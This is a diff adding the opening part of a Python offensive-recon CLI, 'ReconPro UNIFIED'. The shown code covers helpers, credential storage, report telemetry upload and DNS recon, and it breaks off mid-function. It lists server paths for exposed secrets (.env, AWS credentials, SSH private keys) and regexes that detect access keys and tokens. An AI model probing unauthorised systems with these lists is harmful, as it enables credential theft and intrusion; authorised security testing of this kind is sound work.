@@ -1,0 +1,2002 @@
+     1→#!/usr/bin/env python3
+     2→"""
+     3→ReconPro UNIFIED CLI — The Convergence
+     4→=======================================
+     5→All offensive modules fused into one entity.
+     6→One target. One encounter. Eight blades.
+     7→
+     8→  ┌─ RECON          13-category surface reconnaissance
+     9→  ├─ AUTH BYPASS    15 auth bypass techniques
+    10→  ├─ CHAIN HUNTER   SSRF + redirect chain hunting
+    11→  ├─ BOT HUNTER     C2 / bot infrastructure detection
+    12→  ├─ GORGON ULTRA   15-stage AI red team
+    13→  ├─ OBLIVION       23-stage analytical dissolution
+    14→  ├─ VIBESEC        AI/vibe-coding vulnerability benchmark
+    15→  └─ NHI GRAPH      Non-Human Identity & blast-radius mapping
+    16→
+    17→Subcommands:
+    18→    python3 reconpro.py auth login <api-key>    Store API credentials
+    19→    python3 reconpro.py auth status              Show auth status
+    20→    python3 reconpro.py auth logout              Remove credentials
+    21→
+    22→Usage:
+    23→    python3 reconpro.py <target>
+    24→    python3 reconpro.py <target> --modules recon,auth,nhi,vibesec
+    25→    python3 reconpro.py <target> --all --output report.json --upload
+    26→    python3 reconpro.py <target> --insecure --dry-run
+    27→    python3 reconpro.py --list
+    28→    python3 reconpro.py vibesec <target>        Quick vibe-coding audit
+    29→"""
+    30→import argparse
+    31→import hashlib
+    32→import json
+    33→import os
+    34→import re
+    35→import secrets
+    36→import shlex
+    37→import socket
+    38→import ssl
+    39→import subprocess
+    40→import sys
+    41→import time
+    42→import uuid
+    43→import urllib.error
+    44→import urllib.parse
+    45→import urllib.request
+    46→import hmac
+    47→from datetime import datetime
+    48→from typing import Any, Dict, List, Optional, Tuple
+    49→from threading import Lock
+    50→
+    51→# Rich for advanced visuals
+    52→from rich.console import Console, Group
+    53→from rich.panel import Panel
+    54→from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
+    55→from rich.table import Table
+    56→from rich.text import Text
+    57→from rich.align import Align
+    58→from rich.columns import Columns
+    59→from rich.rule import Rule
+    60→from rich.tree import Tree
+    61→from rich.live import Live
+    62→from rich.layout import Layout
+    63→
+    64→console = Console(width=120)
+    65→
+    66→# ── Global Config ──────────────────────────────────────────────────────────
+    67→
+    68→AUDIT_LOG_PATH = "/home/z/my-project/download/reconpro_audit.log"
+    69→_AUDIT_FAIL_WARNED = False
+    70→
+    71→
+    72→class _Config:
+    73→    """Runtime configuration flags — set once from CLI args."""
+    74→    verify_tls: bool = True
+    75→    insecure: bool = False
+    76→    confirm: bool = False
+    77→    dry_run: bool = False
+    78→    quiet: bool = False
+    79→    json_output: bool = False
+    80→
+    81→
+    82→CONFIG = _Config()
+    83→
+    84→# ── m5: Thread-safe rate limiter ──────────────────────────────────────────
+    85→
+    86→class _RateLimiter:
+    87→    """Token-bucket rate limiter — safe for concurrent use.
+    88→
+    89→    Default: 10 requests per second. Use throttle.acquire() before any
+    90→    network call; it blocks until a token is available.
+    91→    """
+    92→
+    93→    def __init__(self, max_per_second: float = 10.0):
+    94→        self._rate = max_per_second
+    95→        self._min_interval = 1.0 / max_per_second
+    96→        self._lock = Lock()
+    97→        self._last = 0.0
+    98→
+    99→    def acquire(self) -> None:
+   100→        """Block until we're allowed to make the next request."""
+   101→        with self._lock:
+   102→            now = time.monotonic()
+   103→            elapsed = now - self._last
+   104→            if elapsed < self._min_interval:
+   105→                time.sleep(self._min_interval - elapsed)
+   106→            self._last = time.monotonic()
+   107→
+   108→
+   109→RATE_LIMITER = _RateLimiter(max_per_second=10.0)
+   110→
+   111→# ── n1: IPv6 range classification ──────────────────────────────────────────
+   112→
+   113→_IPV6_RESERVED_PREFIXES = ("fe80:", "fc", "fd", "::1", "::ffff", "2001:db8:", "::", "ff")
+   114→_IPV6_LINK_LOCAL_RE = re.compile(r'^fe80:', re.IGNORECASE)
+   115→_IPV6_UNIQUE_LOCAL_RE = re.compile(r'^(fc|fd)', re.IGNORECASE)
+   116→_IPV6_LOOPBACK_RE = re.compile(r'^::1$')
+   117→_IPV6_MAPPED_V4_RE = re.compile(r'^::ffff:', re.IGNORECASE)
+   118→_IPV6_DOC_RE = re.compile(r'^2001:db8:', re.IGNORECASE)
+   119→_IPV6_MULTICAST_RE = re.compile(r'^ff[0-9a-f]', re.IGNORECASE)
+   120→
+   121→
+   122→def classify_ipv6(addr: str) -> str:
+   123→    """Classify an IPv6 address. Returns: 'global', 'link_local', 'unique_local',
+   124→    'loopback', 'mapped_v4', 'documentation', 'multicast', 'unspecified'."""
+   125→    if addr == "::":
+   126→        return "unspecified"
+   127→    if _IPV6_LOOPBACK_RE.match(addr):
+   128→        return "loopback"
+   129→    if _IPV6_LINK_LOCAL_RE.match(addr):
+   130→        return "link_local"
+   131→    if _IPV6_UNIQUE_LOCAL_RE.match(addr):
+   132→        return "unique_local"
+   133→    if _IPV6_MAPPED_V4_RE.match(addr):
+   134→        return "mapped_v4"
+   135→    if _IPV6_DOC_RE.match(addr):
+   136→        return "documentation"
+   137→    if _IPV6_MULTICAST_RE.match(addr):
+   138→        return "multicast"
+   139→    return "global"
+   140→
+   141→# ══════════════════════════════════════════════════════════════════════════════
+   142→# RECONPRO UNIFIED IDENTITY
+   143→# ══════════════════════════════════════════════════════════════════════════════
+   144→
+   145→RECONPRO_NAME = "ReconPro UNIFIED"
+   146→RECONPRO_TAGLINE = "Eight Blades. One Target. One Verdict."
+   147→RECONPRO_VERSION = "reconpro-unified-v1.0"
+   148→RECONPRO_SIGNATURE = "X-R3c0nPr0-Un1f13d-S1x-Bl4d3s-0n3-T4rg3t-2026"
+   149→
+   150→BANNER = r"""
+   151→██████╗ ███████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗██████╗ ██████╗ ██╗    ██╗
+   152→██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔════╝██║██╗ ██╔╝
+   153→██████╔╝█████╗  ██║     ███████║█████╗  ██████╔╝█████╗  ██║     ██╔╝██╗██║
+   154→██╔═══╝ ██╔══╝  ██║     ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██║     █████╔╝██║
+   155→██║     ███████╗╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗██╔╝██╗██║
+   156→╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝
+   157→              E I G H T   B L A D E S .   O N E   T A R G E T .   O N E   V E R D I C T.
+   158→"""
+   159→
+   160→MODULES = [
+   161→    {"id": "recon",    "name": "RECON",         "desc": "13-category surface reconnaissance",   "color": "cyan"},
+   162→    {"id": "auth",     "name": "AUTH BYPASS",   "desc": "15 auth bypass techniques",            "color": "yellow"},
+   163→    {"id": "chain",    "name": "CHAIN HUNTER",  "desc": "SSRF + redirect chain hunting",        "color": "magenta"},
+   164→    {"id": "bot",      "name": "BOT HUNTER",    "desc": "C2 / bot infrastructure detection",    "color": "red"},
+   165→    {"id": "gorgon",   "name": "GORGON ULTRA",  "desc": "15-stage AI red team",                 "color": "bright_red"},
+   166→    {"id": "oblivion", "name": "OBLIVION",      "desc": "23-stage analytical dissolution",       "color": "bright_magenta"},
+   167→    {"id": "vibesec",  "name": "VIBESEC",       "desc": "AI/vibe-coding vulnerability benchmark", "color": "bright_green"},
+   168→    {"id": "nhi",      "name": "NHI GRAPH",     "desc": "Non-Human Identity & blast-radius mapping", "color": "cyan"},
+   169→]
+   170→
+   171→# ══════════════════════════════════════════════════════════════════════════════
+   172→# HELPERS
+   173→# ══════════════════════════════════════════════════════════════════════════════
+   174→
+   175→def run_argv(argv: list, timeout: int = 8) -> Tuple[str, str]:
+   176→    """Execute a pre-parsed argv list without any shell interpretation."""
+   177→    try:
+   178→        r = subprocess.run(argv, shell=False, capture_output=True, text=True, timeout=timeout)
+   179→        return r.stdout.strip(), r.stderr.strip()
+   180→    except Exception:
+   181→        return "", ""
+   182→
+   183→
+   184→def run(cmd: str, timeout: int = 8) -> Tuple[str, str]:
+   185→    """Execute a command string safely via shlex.split — no /bin/sh spawned."""
+   186→    if CONFIG.dry_run:
+   187→        audit_log("subprocess.skip", detail=f"dry-run: {cmd[:120]}")
+   188→        return "", ""
+   189→    try:
+   190→        argv = shlex.split(cmd)
+   191→    except ValueError as e:
+   192→        audit_log("subprocess.shlex.error", status=type(e).__name__, detail=str(e))
+   193→        return "", ""
+   194→    if not argv:
+   195→        return "", ""
+   196→    return run_argv(argv, timeout=timeout)
+   197→
+   198→def http_probe(url: str, method: str = "GET", body: Optional[bytes] = None,
+   199→               headers: Optional[Dict[str, str]] = None, timeout: int = 8) -> Dict[str, Any]:
+   200→    """Hardened single HTTP layer — all modules delegate through this."""
+   201→    RATE_LIMITER.acquire()  # m5: thread-safe rate limiting
+   202→    h = {
+   203→        "User-Agent": "ReconPro-Unified/1.0 (Six-Blades-One-Target; +https://reconpro.security)",
+   204→        "X-ReconPro-Signature": RECONPRO_SIGNATURE,
+   205→        "Accept": "application/json,text/plain,*/*",
+   206→    }
+   207→    if headers:
+   208→        h.update(headers)
+   209→    req = urllib.request.Request(url, data=body, method=method, headers=h)
+   210→    try:
+   211→        ctx = ssl.create_default_context()
+   212→        if CONFIG.insecure:
+   213→            ctx.check_hostname = False
+   214→            ctx.verify_mode = ssl.CERT_NONE
+   215→        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+   216→            raw = resp.read(8192)
+   217→            return {
+   218→                "ok": True, "status": resp.status, "reason": resp.reason,
+   219→                "headers": dict(resp.headers.items()),
+   220→                "body": raw.decode("utf-8", errors="replace")[:8192],
+   221→            }
+   222→    except urllib.error.HTTPError as e:
+   223→        try:
+   224→            raw = e.read(8192)
+   225→            body_str = raw.decode("utf-8", errors="replace")[:8192]
+   226→        except Exception:
+   227→            body_str = ""
+   228→        return {
+   229→            "ok": False, "status": e.code, "reason": e.reason,
+   230→            "headers": dict(e.headers.items()) if e.headers else {},
+   231→            "body": body_str,
+   232→        }
+   233→    except Exception as e:
+   234→        return {"ok": False, "status": 0, "reason": str(e), "headers": {}, "body": ""}
+   235→
+   236→# ── C3: JSON Lines audit log (injection-immune) ──────────────────────────
+   237→
+   238→def audit_log(event: str, status: str = "ok", detail: str = "") -> None:
+   239→    """Append a JSON Lines record to the audit log. Injection-immune via json.dumps."""
+   240→    global _AUDIT_FAIL_WARNED
+   241→    record = {
+   242→        "ts": datetime.utcnow().isoformat() + "Z",
+   243→        "event": event,
+   244→        "status": status,
+   245→        "detail": detail,
+   246→    }
+   247→    try:
+   248→        os.makedirs(os.path.dirname(AUDIT_LOG_PATH) or ".", exist_ok=True)
+   249→        with open(AUDIT_LOG_PATH, "a") as f:
+   250→            f.write(json.dumps(record, ensure_ascii=False, separators=(",", ":")) + "\n")
+   251→    except Exception:
+   252→        if not _AUDIT_FAIL_WARNED:
+   253→            _AUDIT_FAIL_WARNED = True
+   254→            sys.stderr.write(f"[reconpro] WARNING: audit log write failed for {AUDIT_LOG_PATH}\n")
+   255→
+   256→# ── M1: Confirm gate ──────────────────────────────────────────────────────
+   257→
+   258→def _confirm_proceed(label: str) -> bool:
+   259→    """Prompt user for confirmation before destructive operations.
+   260→    Only activates when CONFIG.confirm is True AND not in dry-run mode.
+   261→    """
+   262→    if not CONFIG.confirm or CONFIG.dry_run:
+   263→        return True
+   264→    from rich.panel import Panel as _Panel
+   265→    from rich.text import Text as _Text
+   266→    try:
+   267→        console.print(_Panel(
+   268→            _Text(f"About to execute: {label}", style="bold yellow"),
+   269→            border_style="yellow",
+   270→            title="[bold]CONFIRM[/bold]",
+   271→            title_align="left",
+   272→            padding=(1, 2),
+   273→        ))
+   274→        answer = input("proceed? > ").strip().lower()
+   275→        return answer in ("y", "yes", "ok")
+   276→    except (EOFError, KeyboardInterrupt):
+   277→        return False
+   278→
+   279→# ── VibeSec Grade Mapping ─────────────────────────────────────────────
+   280→
+   281→VIBESEC_GRADE_MAP = [
+   282→    (90, "A+", "bright_green"),
+   283→    (80, "A",  "green"),
+   284→    (65, "B",  "yellow"),
+   285→    (50, "C",  "red"),
+   286→    (35, "D",  "bright_red"),
+   287→    (0,  "F",  "bold bright_red"),
+   288→]
+   289→
+   290→VIBESEC_SENSITIVE_PATHS = [
+   291→    "/.env", "/.env.local", "/.env.production", "/.env.development",
+   292→    "/.git/config", "/.git/HEAD", "/.gitignore",
+   293→    "/docker-compose.yml", "/docker-compose.yaml",
+   294→    "/config.json", "/config.yaml", "/config.yml",
+   295→    "/package.json", "/.npmrc",
+   296→    "/vercel.json", "/netlify.toml",
+   297→    "/firebase.json", "/firestore.rules",
+   298→    "/.vscode/settings.json", "/.idea/workspace.xml",
+   299→    # Stage 1 additions: AWS credentials, SSH keys, CI secrets
+   300→    "/.aws/credentials", "/.aws/config",
+   301→    "/.ssh/id_rsa", "/.ssh/id_ed25519", "/.ssh/authorized_keys",
+   302→    "/.github/workflows/secret", "/.gitlab-ci.yml",
+   303→    "/travis.yml", "/.circleci/config.yml",
+   304→]
+   305→
+   306→VIBESEC_API_PATHS = [
+   307→    "/api/webhooks", "/api/trpc", "/api/v1/admin", "/api/v1/users",
+   308→    "/api/v1/config", "/api/internal", "/api/debug",
+   309→    "/api/graphql", "/api/stripe/webhook", "/api/upload",
+   310→    "/admin", "/admin/login", "/dashboard",
+   311→]
+   312→
+   313→VIBESEC_ANON_KEY_PATTERNS = [
+   314→    ("supabase", re.compile(r'[\w-]*\.supabase\.co', re.I)),
+   315→    ("firebase", re.compile(r'[\w-]*\.firebaseapp\.com', re.I)),
+   316→    ("aws-s3", re.compile(r's3\.amazonaws\.com|s3-\w+-\d+\.amazonaws\.com', re.I)),
+   317→    ("cloudflare-r2", re.compile(r'[\w-]+\.r2\.cloudflarestorage\.com', re.I)),
+   318→    ("vercel-blob", re.compile(r'blob\.vercel-storage\.com', re.I)),
+   319→    ("gcp-storage", re.compile(r'storage\.googleapis\.com', re.I)),
+   320→    ("azure-blob", re.compile(r'[\w]+\.blob\.core\.windows\.net', re.I)),
+   321→]
+   322→
+   323→VIBESEC_DB_ADMIN_PATHS = [
+   324→    "/phpmyadmin", "/phpmyadmin/", "/adminer", "/adminer.php",
+   325→    "/mongo-express", "/mongo-express/", "/_utils",
+   326→    "/pgadmin4", "/pgadmin/",
+   327→    "/redis-commander", "/redis-insight",
+   328→    "/prisma-studio", "/studio.apollo",
+   329→    "/graphql-playground", "/altair",
+   330→    "/db-browser", "/dbeaver",
+   331→]
+   332→
+   333→VIBESEC_S3_LISTING_INDICATORS = [
+   334→    "ListBucketResult", "<Key>", "<Contents>", "Name</", "Prefix</",
+   335→    "<IsTruncated>", "listbucket", "BucketListing",
+   336→]
+   337→
+   338→VIBESEC_SECURITY_HEADERS = [
+   339→    ("strict-transport-security", "HSTS", "high", 8),
+   340→    ("content-security-policy", "CSP", "medium", 6),
+   341→    ("x-content-type-options", "X-Content-Type-Options", "medium", 4),
+   342→    ("referrer-policy", "Referrer-Policy", "low", 3),
+   343→    ("permissions-policy", "Permissions-Policy", "low", 2),
+   344→]
+   345→
+   346→VIBESEC_STORAGE_EXPOSURE_PATHS = [
+   347→    "/uploads/", "/static/uploads/", "/media/", "/files/",
+   348→    "/public/", "/assets/", "/images/",
+   349→]
+   350→
+   351→VIBESEC_AUTH_PATTERN = re.compile(r'(?i)(unauthorized|forbidden|401|403|login required|authentication required|"error":.*auth)')
+   352→
+   353→# ── NHI Graph: Identity & Over-Permission Patterns ──────────────────────
+   354→
+   355→NHI_IDENTITY_PATTERNS = [
+   356→    # AWS IAM role ARN pattern
+   357→    ("aws_iam_role", re.compile(r'arn:aws:iam::\d+:role/[\w-]+', re.I)),
+   358→    # AWS IAM user
+   359→    ("aws_iam_user", re.compile(r'arn:aws:iam::\d+:user/[\w-]+', re.I)),
+   360→    # AWS access key format
+   361→    ("aws_access_key", re.compile(r'AKIA[0-9A-Z]{16}', re.I)),
+   362→    # GCP service account email
+   363→    ("gcp_service_account", re.compile(r'[\w.-]+@[\w.-]+\.iam\.gserviceaccount\.com', re.I)),
+   364→    # GCP project number
+   365→    ("gcp_project", re.compile(r'projects/\d+', re.I)),
+   366→    # Azure AD app registration / client ID (UUID format)
+   367→    ("azure_app_id", re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)),
+   368→    # Azure managed identity
+   369→    ("azure_managed_identity", re.compile(r'/subscriptions/[0-9a-f-]+/resourcegroups/[\w-]+/providers/Microsoft.ManagedIdentity', re.I)),
+   370→    # Generic API key patterns
+   371→    ("api_key_generic", re.compile(r'(?:api[_-]?key|apikey|secret[_-]?key|access[_-]?token)[\s]*[:=]\s*["\']?([\w\-]{20,})', re.I)),
+   372→    # Bearer tokens in responses
+   373→    ("bearer_token", re.compile(r'Bearer\s+eyJ[\w.-]+', re.I)),
+   374→    # Webhook secrets
+   375→    ("webhook_secret", re.compile(r'whsec_[\w]+|whsec_[\w-]+', re.I)),
+   376→]
+   377→
+   378→NHI_OVERPERMISSION_PATTERNS = [
+   379→    ("wildcard_action", re.compile(r'\*|"Action":\s*"\*"', re.I)),
+   380→    ("wildcard_resource", re.compile(r'Resource":\s*"\*"|"\*"', re.I)),
+   381→    ("admin_wildcard", re.compile(r'AdministratorAccess|FullAccess|PowerUserAccess', re.I)),
+   382→    ("s3_full_bucket", re.compile(r's3:\*', re.I)),
+   383→    ("iam_passrole", re.compile(r'iam:PassRole', re.I)),
+   384→]
+   385→
+   386→
+   387→# ══════════════════════════════════════════════════════════════════════════════
+   388→# CLI AUTH & TELEMETRY
+   389→# ══════════════════════════════════════════════════════════════════════════════
+   390→
+   391→CREDENTIALS_DIR = os.path.expanduser("~/.reconpro")
+   392→CREDENTIALS_FILE = os.path.join(CREDENTIALS_DIR, "credentials.json")
+   393→CONFIG_FILE = os.path.join(CREDENTIALS_DIR, "config.json")  # Primary config (auth validated)
+   394→TELEMETRY_ENDPOINT = "https://api.reconpro.io/api/v1/telemetry/upload"
+   395→AUTH_VALIDATE_ENDPOINT = "https://api.reconpro.io/api/v1/auth/validate"
+   396→
+   397→
+   398→def _load_credentials() -> Dict[str, str]:
+   399→    """Load stored credentials from ~/.reconpro/config.json (primary) or credentials.json (fallback)."""
+   400→    for path in [CONFIG_FILE, CREDENTIALS_FILE]:
+   401→        try:
+   402→            if os.path.exists(path):
+   403→                with open(path, "r") as f:
+   404→                    data = json.load(f)
+   405→                    if isinstance(data, dict) and "api_key" in data:
+   406→                        return data
+   407→        except Exception as e:
+   408→            audit_log("credentials.load.error", status=type(e).__name__, detail=str(e)[:120])
+   409→    return {}
+   410→
+   411→
+   412→def _save_credentials(data: Dict[str, str], primary: bool = True) -> bool:
+   413→    """Save credentials to ~/.reconpro/config.json (primary) or credentials.json (fallback).
+   414→    When primary=True, also writes to credentials.json for backward compat."""
+   415→    target = CONFIG_FILE if primary else CREDENTIALS_FILE
+   416→    try:
+   417→        os.makedirs(CREDENTIALS_DIR, mode=0o700, exist_ok=True)
+   418→        fd = os.open(target, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+   419→        with os.fdopen(fd, "w") as f:
+   420→            json.dump(data, f, indent=2)
+   421→        audit_log("credentials.saved", detail=f"api_key stored at {target}")
+   422→        # Write to fallback too if primary
+   423→        if primary and target != CREDENTIALS_FILE:
+   424→            try:
+   425→                fd2 = os.open(CREDENTIALS_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+   426→                with os.fdopen(fd2, "w") as f2:
+   427→                    json.dump(data, f2, indent=2)
+   428→            except Exception:
+   429→                pass  # best-effort fallback
+   430→        return True
+   431→    except Exception as e:
+   432→        audit_log("credentials.save.error", status=type(e).__name__, detail=str(e)[:120])
+   433→        return False
+   434→
+   435→
+   436→def _delete_credentials() -> bool:
+   437→    """Remove stored credentials from both config.json and credentials.json."""
+   438→    success = True
+   439→    for path in [CONFIG_FILE, CREDENTIALS_FILE]:
+   440→        try:
+   441→            if os.path.exists(path):
+   442→                os.remove(path)
+   443→        except Exception as e:
+   444→            audit_log("credentials.delete.error", status=type(e).__name__, detail=str(e)[:120])
+   445→            success = False
+   446→    return success
+   447→
+   448→
+   449→def cmd_auth_login(api_key: str) -> None:
+   450→    """Authenticate and store API key locally. Optionally validates against control plane."""
+   451→    if not api_key or len(api_key) < 8:
+   452→        console.print("[red]Invalid API key. Must be at least 8 characters.[/]")
+   453→        return
+   454→    creds_data = {"api_key": api_key, "stored_at": datetime.utcnow().isoformat() + "Z"}
+   455→    # Attempt online validation if network is available (best-effort)
+   456→    try:
+   457→        validate_resp = http_probe(AUTH_VALIDATE_ENDPOINT, method="POST",
+   458→                                    body=json.dumps({"api_key": api_key}).encode(),
+   459→                                    headers={"Content-Type": "application/json"}, timeout=5)
+   460→        if validate_resp.get("status") == 200 and validate_resp.get("ok"):
+   461→            vdata = json.loads(validate_resp.get("body", "{}"))
+   462→            if vdata.get("valid"):
+   463→                creds_data["org_id"] = vdata.get("org_id", "")
+   464→                creds_data["quota_remaining"] = vdata.get("quota_remaining", 0)
+   465→                creds_data["scopes"] = vdata.get("scopes", [])
+   466→                creds_data["validated"] = True
+   467→                console.print(f"[green]Authenticated.[/] API key validated against control plane.")
+   468→                console.print(f"  Key prefix: {api_key[:8]}...{api_key[-4:]}")
+   469→                console.print(f"  Quota remaining: [bold]{vdata.get('quota_remaining', '?')}[/]")
+   470→                console.print(f"  Org ID: [dim]{vdata.get('org_id', '?')}[/]")
+   471→                console.print(f"  Stored at: {CONFIG_FILE}")
+   472→                _save_credentials(creds_data)
+   473→                return
+   474→    except Exception:
+   475→        pass  # Offline — store locally without validation
+   476→    if not _save_credentials(creds_data):
+   477→        console.print("[red]Failed to save credentials.[/]")
+   478→        return
+   479→    console.print(f"[yellow]Authenticated (offline).[/] API key stored at {CONFIG_FILE}")
+   480→    console.print(f"  Key prefix: {api_key[:8]}...{api_key[-4:]}")
+   481→    console.print(f"  [dim]Run with network access to validate against control plane.[/]")
+   482→
+   483→
+   484→def cmd_auth_status() -> None:
+   485→    """Show current authentication status."""
+   486→    creds = _load_credentials()
+   487→    if creds and "api_key" in creds:
+   488→        key = creds["api_key"]
+   489→        validated = creds.get("validated", False)
+   490→        org_id = creds.get("org_id", "")
+   491→        quota = creds.get("quota_remaining", "?")
+   492→        stored = creds.get("stored_at", "unknown")
+   493→        status_color = "green" if validated else "yellow"
+   494→        console.print(f"[{status_color}]{'Authenticated (validated)' if validated else 'Authenticated (offline)'}.[/]")
+   495→        console.print(f"  Key prefix: [bold]{key[:8]}...{key[-4:]}[/]")
+   496→        console.print(f"  Stored at: [dim]{stored}[/]")
+   497→        console.print(f"  Config file: [dim]{CONFIG_FILE}[/]")
+   498→        if org_id:
+   499→            console.print(f"  Org ID: [dim]{org_id}[/]")
+   500→        console.print(f"  Quota remaining: [bold]{quota}[/]")
+   501→        scopes = creds.get("scopes", [])
+   502→        if scopes:
+   503→            console.print(f"  Scopes: [dim]{', '.join(scopes)}[/]")
+   504→    else:
+   505→        console.print("[yellow]Not authenticated.[/] No API key found.")
+   506→        console.print(f"  Run: [cyan]reconpro.py auth login <api-key>[/]")
+   507→
+   508→
+   509→def cmd_auth_logout() -> None:
+   510→    """Remove stored credentials from both config.json and credentials.json."""
+   511→    if _delete_credentials():
+   512→        console.print("[green]Logged out.[/] Credentials removed from ~/.reconpro/")
+   513→    else:
+   514→        console.print("[red]Failed to remove credentials.[/]")
+   515→
+   516→
+   517→def _sign_report(report: Dict[str, Any]) -> str:
+   518→    """HMAC-SHA256 sign a report for tamper-proof telemetry."""
+   519→    creds = _load_credentials()
+   520→    api_key = creds.get("api_key", "")
+   521→    canonical = json.dumps(report, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
+   522→    signature = hmac.new(api_key.encode(), canonical.encode(), hashlib.sha256).hexdigest()
+   523→    return signature
+   524→
+   525→
+   526→def _upload_telemetry(report: Dict[str, Any]) -> bool:
+   527→    """POST signed report to telemetry endpoint. Returns True on success."""
+   528→    creds = _load_credentials()
+   529→    if not creds.get("api_key"):
+   530→        audit_log("telemetry.skip", detail="no api_key configured")
+   531→        return False
+   532→    signature = _sign_report(report)
+   533→    payload = json.dumps({
+   534→        "report": report,
+   535→        "signature": signature,
+   536→        "api_key_prefix": creds["api_key"][:8],
+   537→    }).encode()
+   538→    try:
+   539→        RATE_LIMITER.acquire()
+   540→        req = urllib.request.Request(
+   541→            TELEMETRY_ENDPOINT,
+   542→            data=payload,
+   543→            method="POST",
+   544→            headers={
+   545→                "Content-Type": "application/json",
+   546→                "User-Agent": f"ReconPro-Unified/{RECONPRO_VERSION}",
+   547→                "X-ReconPro-Signature": RECONPRO_SIGNATURE,
+   548→                "Authorization": f"Bearer {creds['api_key']}",
+   549→            },
+   550→        )
+   551→        ctx = ssl.create_default_context()
+   552→        if CONFIG.insecure:
+   553→            ctx.check_hostname = False
+   554→            ctx.verify_mode = ssl.CERT_NONE
+   555→        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
+   556→            if resp.status < 300:
+   557→                audit_log("telemetry.upload.ok", detail=f"status={resp.status}")
+   558→                return True
+   559→            else:
+   560→                audit_log("telemetry.upload.error", detail=f"status={resp.status}")
+   561→                return False
+   562→    except Exception as e:
+   563→        audit_log("telemetry.upload.error", status=type(e).__name__, detail=str(e)[:120])
+   564→        return False
+   565→
+   566→
+   567→def _save_local_fallback(report: Dict[str, Any]) -> str:
+   568→    """Save report locally when upload fails — graceful offline fallback."""
+   569→    os.makedirs("/home/z/my-project/download", exist_ok=True)
+   570→    safe_host = _safe_filename(report.get("target", "unknown"))
+   571→    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+   572→    path = f"/home/z/my-project/download/reconpro_pending_{safe_host}_{ts}.json"
+   573→    try:
+   574→        with open(path, "w") as f:
+   575→            json.dump(report, f, indent=2, default=str)
+   576→        audit_log("telemetry.fallback.saved", detail=path)
+   577→        return path
+   578→    except Exception as e:
+   579→        audit_log("telemetry.fallback.error", status=type(e).__name__, detail=str(e)[:120])
+   580→        return ""
+   581→
+   582→
+   583→def upload_report(report: Dict[str, Any]) -> None:
+   584→    """Attempt telemetry upload with graceful offline fallback."""
+   585→    console.print(f"\n  [cyan]Telemetry:[/] Attempting upload to {TELEMETRY_ENDPOINT}...")
+   586→    if _upload_telemetry(report):
+   587→        console.print(f"  [green]Upload successful.[/] Report synced to cloud.")
+   588→    else:
+   589→        local_path = _save_local_fallback(report)
+   590→        if local_path:
+   591→            console.print(f"  [yellow]Upload failed (offline/no-key).[/] Saved locally: [bold]{local_path}[/]")
+   592→            console.print(f"  [dim]Re-upload later with: reconpro.py <target> --upload[/]")
+   593→        else:
+   594→            console.print(f"  [red]Upload failed and local save failed. Report may be lost.[/]")
+   595→
+   596→
+   597→def generate_encounter_id(host: str) -> str:
+   598→    """Generate a globally unique encounter ID. Uses uuid4 — no collision window."""
+   599→    raw = uuid.uuid4().hex[:12].upper()
+   600→    return f"RPU-{raw}"
+   601→
+   602→# ══════════════════════════════════════════════════════════════════════════════
+   603→# MODULE 1: RECON — 13-category surface reconnaissance
+   604→# ══════════════════════════════════════════════════════════════════════════════
+   605→
+   606→def module_recon(host: str) -> Dict[str, Any]:
+   607→    """13-category surface reconnaissance."""
+   608→    findings: List[Dict[str, Any]] = []
+   609→    categories_run: List[str] = []
+   610→
+   611→    def add(title, severity, category, description, evidence):
+   612→        findings.append({
+   613→            "title": title, "severity": severity, "category": category,
+   614→            "description": description, "evidence": evidence, "asset": host,
+   615→        })
+   616→
+   617→    # 1. DNS
+   618→    categories_run.append("DNS Enumeration")
+   619→    out, _ = run(f"dig +short +time=3 +tries=1 {host} A")
+   620→    a_records = [l.strip() for l in out.split('\n') if l.strip() and re.match(r'^\d+\.\d+', l)]
+   621→    if a_records:
+   622→        add(f"DNS A Record — {len(a_records)} IPv4 address(es)", "info", "dns",
+   623→            f"Domain resolves to {len(a_records)} IPv4: {', '.join(a_records[:5])}",
+   624→            f"A: {', '.join(a_records[:5])}")
+   625→    out, _ = run(f"dig +short +time=3 +tries=1 {host} AAAA")
+   626→    aaaa = [l.strip() for l in out.split('\n') if l.strip()]
+   627→    if aaaa:
+   628→        v6_classes = {classify_ipv6(a) for a in aaaa}
+   629→        private_count = sum(1 for c in v6_classes if c != "global")
+   630→        scope_note = f" ({len(v6_classes)} scope classes: {', '.join(sorted(v6_classes))})" if len(v6_classes) > 1 else ""
+   631→        if private_count:
+   632→            add(f"DNS AAAA — {len(aaaa)} IPv6, {private_count} non-global{scope_note}", "medium", "dns",
+   633→                f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
+   634→        else:
+   635→            add(f"DNS AAAA — {len(aaaa)} global IPv6{scope_note}", "info", "dns",
+   636→                f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
+   637→    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} MX")
+   638→    mx = [l.strip() for l in out.split('\n') if 'MX' in l]
+   639→    if mx:
+   640→        add(f"MX Records — {len(mx)} mail server(s)", "info", "dns", f"{len(mx)} mail servers", "; ".join(mx[:3]))
+   641→    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} NS")
+   642→    ns = [l.strip() for l in out.split('\n') if 'NS' in l]
+   643→    if ns:
+   644→        add(f"NS Records — {len(ns)} nameserver(s)", "info", "dns", f"{len(ns)} nameservers", "; ".join(ns[:3]))
+   645→    out, _ = run(f"dig +short +time=3 +tries=1 {host} TXT")
+   646→    txt_lines = [l for l in out.split('\n') if l.strip()]
+   647→    if txt_lines:
+   648→        spf = [t for t in txt_lines if 'spf' in t.lower()]
